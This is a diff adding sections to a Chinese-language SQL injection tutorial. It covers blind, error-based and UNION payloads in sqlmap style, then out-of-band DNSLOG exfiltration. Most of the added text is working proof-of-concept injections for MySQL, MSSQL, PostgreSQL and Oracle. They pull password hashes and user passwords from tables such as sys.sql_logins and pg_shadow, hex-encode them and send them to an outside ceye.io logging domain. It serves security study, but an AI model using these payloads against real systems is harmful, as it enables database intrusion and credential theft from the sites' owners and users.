@@ -64,7 +64,9 @@
 
 例如：猜一下，是不是还有个函数叫database_name(),测试 ```tom' and  SUBSTRING(database_name(),1,1)='a'     ;--``` 查看页面结果或响应状态。
 
-构造一个fuzz：```tom'\+and\+SUBSTRING\(database_name\(\),[0-9],1\)='\w'\+;--```，查看哪些响应中含有“...already exists please try to register with a different username.”，发现数据库名为“HSQLDB” ,是Java内置的数据库。
+构造一个fuzz：```tom'\+and\+SUBSTRING\(database_name\(\),[0-9],1\)='\w'\+;--```，查看响应中含有“...already exists please try to register with a different username.”，发现数据库名为“HSQLDB” ,是Java内置的数据库。
+
+
 
 ### 猜测用户名
 
@@ -504,3 +506,231 @@ Options:
 探测目标指纹信息，参数 -f 或者 --fingerprint，它的效果与 --banner 相似。
 
 `$ python sqlmap.py -u "http://127.0.0.1/sqli/Less-3/?id=1" -f`
+
+
+## sqlmap的一些payload
+假设 Parameter: id (GET)
+
+- Type: boolean-based blind：
+
+`Payload: id=(SELECT (CASE WHEN (8447=8447) THEN 1 ELSE (SELECT 6925 UNION SELECT 4265) END))`
+
+- Type: error-based: 
+
+`id=1 AND (SELECT 8358 FROM(SELECT COUNT(*),CONCAT(0x716b707071,(SELECT (ELT(8358=8358,1))),0x716b766a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)`
+
+说明：ELT(N,str1,str2,str3,...) ， Returns str1 if N = 1, str2 if N = 2, and so on. Returns NULL if N is less than 1 or greater than the number of arguments. ELT() is the
+complement of FIELD().
+
+说明：FLOOR(X) Returns the largest integer value not greater than X.
+
+
+- Type: time-based blind
+
+`id=1 AND (SELECT 5177 FROM (SELECT(SLEEP(5)))ynSj)`
+
+- Type: UNION query
+
+`id=-5237 UNION ALL SELECT NULL,NULL,CONCAT(0x716b707071,0x7966736e67425968536f6e4e686d55544e654d4d737473774568637945746b77435063674d525141,0x716b766a71),NULL,NULL,NULL,NULL,NULL-- -`
+
+
+## DNSLOG 应用
+
+dnslog在sql注入中的应用是一种out-band应用，达到旁路查看执行效果的作用。此外在命令注入、ssrf等中也可应用。
+### mysql中的情况
+必要条件：
+- 目标可以访问dnslog网站,（hyuga、CEYE）
+- mysql数据库可以调用 load_file()
+- 目标平台为windows（因为windows使用UNC路径）
+- 反馈内容受DNS查询限制，太长的需要做字符串切割（例如：substring(str,1,10))
+
+
+
+mysql服务端的文件读取有很多的条件限制，主要是mysql数据库的配置，为了安全原因，当读取位于服务器上的文本文件时，文件必须处于数据库目录且可被所有人读取。
+
+可以在mysql命令控制台执行`show variables like '%secure%'` 来查看。会列出`secure_auth`和`secure_file_priv` , 然后使用`select @@secure_file_priv`查看内容。
+
+
+参数是用来限制LOAD DATA,SELECT ... OUTFILE,DUMPFILE和LOAD_FILE()可以操作的文件夹。
+
+`secure-file-priv` 的值可以分为三种情况：
+- 值为null，表示显示mysqld不允许导入|导出;
+- 值为/tmp/，表示限制mysqld的导入|导出只能发生在/tmp/目录下，此时如果读写发生在其他文件夹中，就会报错;
+- 没有具体值，表示不对mysqld的导入|导出做限制。
+
+除此之外，读取或写入文件必须拥有可操作的用户权限否则会报错。ERROR 1045 (28000): Access denied for user
+
+下面使用load_file() 读取本地文件，假设可注入参数为：id。
+
+载荷：`id=1 union select 1,2,load_file(concat('\\\\',(select hex(password) from test.test_user where  user='admin' limit 1),'.mysql.nk40ci.ceye.io\\abc'))`
+
+说明：
+- `password`的值会被传到.mysql.nk40ci.ceye.io\\abc。
+- 使用hex()目的是减少特殊字符不能被DNS解析等干扰或编码；
+- linux下无法用load_file使用dnslog，这是因为windows下使用UNC路径，即windows命名管理，用于指定和映射驱动器。例如 `\\\ss.xx\t\`
+- 上面CONCAT函数拼接了4个\ ,转义后就是2个，使用unc路径，最后构造的就是 `\\密码16进制值.mysql.nk40ci.ceye.io\abc`
+
+### mssql
+
+网上流传较广的一个poc：
+```
+DECLARE @host varchar(1024);
+
+SELECT @host=(SELECT TOP 1master.dbo.fn_varbintohexstr(password_hash)FROM sys.sql_loginsWHERE name='sa')+'.ip.port.b182oj.ceye.io';
+
+EXEC('master..xp_dirtree"\'+@host+'\foobar$"');
+```
+
+上面的代码可以在数据库控制台执行，得到sa用户hex编码。
+
+ms sqlserver 中字段名是不能和自定义函数名字冲突的，如果冲突需要[] 将字段用包裹，例如：
+
+`select pass FROM test.dbo.test_user where [USER]='admin'`
+
+这里的user字段正好和系统的user()函数相同，所以字段需要 [ ] 包裹。
+
+此外，在sqlserver中当需要字符串拼接的时候，如果字段的值的长度没有达到表结构字段的长度，就会用空格来填充。例如pass字段设置的长度是50，所但是值实际的长度是8，之所以剩余的长度就用空格填充了。这个时候就用想办法去掉空格，查阅手册可以发现rtrim函数是可以去除右边空格的：
+`select ((select rtrim(pass) from test.dbo.test_user where [USER]='admin')+'.xxnk40ci.ceye.io')`
+
+由于域名是不能带有些特殊字符的，所以我们最好能将查询出来的值编码之后再和域名进行拼接，但是在查阅了sqlserver的手册之后，没有发现可以直接对字符类型进行编码的函数，只有将2进制转换成Hex的函数，所以这里我需要先将字符类型强制转换成varbinary二进制类型，然后再将二进制转化成Hex编码之后的字符类型。先转换成二进制,再把二进制转换成字符类型的Hex编码:
+
+`select ((select master.dbo.fn_varbintohexstr(convert(varbinary,rtrim(pass))) from test.dbo.test_user where [USER]='admin')+'.xx.nk40ci.ceye.io')`
+
+完整poc：
+```
+http://127.0.0.1/mssql.php?id=1;
+DECLARE @host varchar(1024);SELECT @host=(SELECT master.dbo.fn_varbintohexstr(convert(varbinary,rtrim(pass))) 
+FROM test.dbo.test_user where [USER] = 'admin')%2b'.cece.nk40ci.ceye.io';
+EXEC('master..xp_dirtree "\'%2b@host%2b'\foobar$"');
+```
+此处有个小问题，因为拼接用到了+号，+号在url中如果不url编码到代码层的时候就成空格了，所以我们需要在提交之前对+号url编码为%2b
+
+ms sqlserver的其它函数：
+- master..xp_fileexist
+- master..xp_subdirs
+- OpenRowset() 
+- OpenDatasource() 
+
+后面两个是加载远程数据库的函数，需要较高权限，系统默认是关闭的，需要通过sp_configure去配置高级选项开启：
+
+```
+exec sp_configure 'show advanced options',1；　　
+
+reconfigure；　　
+
+exec sp_configure 'Ad Hoc Distributed Queries',1；　　
+
+reconfigure；
+```
+
+### postgresql
+
+可以编写一个自定义的函数和存储过程，和SQLServer类似.
+
+
+copy函数的定义
+```
+COPY tablename [ ( column [, ...] ) ] 
+FROM { 'filename' | STDIN } [ WITH ] [ BINARY ] [ OIDS ] [ DELIMITER [ AS ] 'delimiter' 'null string' ] CSV [ QUOTE [ AS ] 'quote' 'escape' ] 
+[ FORCE NOT NULL column [, ...] ] 
+COPY tablename [ ( column [, ...] ) ] TO { 'filename' | STDOUT } [ WITH ] [ BINARY ] [ OIDS ] [ DELIMITER [ AS ] 'delimiter' 'null string' ] 
+CSV [ QUOTE [ AS ] 'quote' 'escape' ] [ FORCE QUOTEcolumn [, ...] ]
+```
+
+从定义看出这里是无法嵌套查询，它这里需要直接填入文件名，所以过程就麻烦一点。
+
+这是网上的POC，整体上没有什么问题。
+```
+DROP TABLE IF EXISTS table_output;
+CREATE TABLE table_output(content text);
+CREATE OR REPLACE FUNCTION temp_function()RETURNS VOID AS $$DECLARE exec_cmd TEXT;
+DECLARE query_result TEXT;BEGINSELECT INTO query_result (SELECT passwdFROM pg_shadow WHERE usename='postgres');
+exec_cmd := E'COPY table_output(content)FROM E\'\\\\'||query_result||E'.postgreSQL.nk40ci.ceye.io\\foobar.txt\'';
+EXECUTE exec_cmd;END;$$ LANGUAGE plpgSQL SECURITY DEFINER;SELECT temp_function();
+```
+
+只是需要对数据处理编一下码，此处会用到encode函数，如下
+
+`encode(pass::bytea,’hex’)`
+
+最后完整的POC如下：
+
+```
+http://127.0.0.1/pgSQL.php?id=1;DROP TABLE IF EXISTS table_output;
+
+CREATE TABLE table_output(content text);
+
+CREATE OR REPLACE FUNCTION temp_function() RETURNS VOID AS $$ DECLARE exec_cmd TEXT;
+
+DECLARE query_result TEXT;
+
+BEGIN SELECT INTO query_result (select encode(pass::bytea,'hex') from test_user where id =1);
+
+exec_cmd := E'COPY table_output(content) FROM E\'\\\\\\\\'||query_result||E'.pSQL.3.nk40ci.ceye.io\\\\foobar.txt\'';
+
+   EXECUTE exec_cmd;
+
+END;
+
+$$ LANGUAGE plpgSQL SECURITY DEFINER;
+
+SELECT temp_function();
+
+```
+
+因为这里的copy需要的参数是文件路径，所以这里其实也是利用了UNC路径，因此这个方式也只能在windows下使用
+
+#### db_link扩展
+
+db_link是PostreSQL用来连接其他的数据库的扩展，用法也很简单，而且可以嵌套子查询，那就很方便了
+```
+dblink('连接串', 'SQL语句')
+http://127.0.0.1/pgsql.php?id=1;CREATE EXTENSION dblink; 
+SELECT * FROM dblink('host='||(select encode(pass::bytea,'hex') from test_user where id =1)||'.vvv.psql.3.nk40ci.ceye.io user=someuser dbname=somedb', 
+'SELECT version()') RETURNS (result TEXT);
+```
+
+CREATE EXTENSION dblink; 就是打开这个扩展，因为这个扩展默认是关闭的。
+
+### Oracle
+Oracle的利用方式就太多了，因为Oracle能够发起网络请求的模块是很很多的。
+
+列举几个:
+
+- UTL_HTTP.REQUEST
+```
+select name from test_user where id =1 union SELECT UTL_HTTP.REQUEST((select pass from test_user where id=1)||'.nk40ci.ceye.io') FROM sys.DUAL;
+
+```
+
+- DBMS_LDAP.INIT
+
+```
+select name from test_user where id =1 union SELECT DBMS_LDAP.INIT((select pass from test_user where id=1)||'.nk40ci.ceye.io',80) FROM sys.DUAL;
+```
+
+- HTTPURITYPE
+```
+select name from test_user where id =1 union SELECT HTTPURITYPE((select pass from test_user where id=1)||'.xx.nk40ci.ceye.io').GETCLOB() FROM sys.DUAL;
+```
+
+- UTL_INADDR.GET_HOST_ADDRESS
+```
+select name from test_user where id =1 union SELECT UTL_INADDR.GET_HOST_ADDRESS((select pass from test_user where id=1)||'.ddd.nk40ci.ceye.io') FROM sys.DUAL; 
+```
+
+tips：oracle是不允许select语句后面没有表的，所以此处可以跟一个伪表dual
+
+- Oracle其他一些能够发起网络请求的模块：
+  - UTL_HTTP
+  - UTL_TCP
+  - UTL_SMPTP
+  - UTL_URL
+ 
+
+### 总结
+有些函数的使用操作系统的限制。
+dns查询有长度限制，所以必要的时候需要对查询结果做字符串的切割。
+避免一些特殊符号的产生，最好的选择就是数据先编码再带出。
+注意不同数据库的语法是有差异的，特别是在数据库拼接的时候。
+有些操作是需要较高的权限。
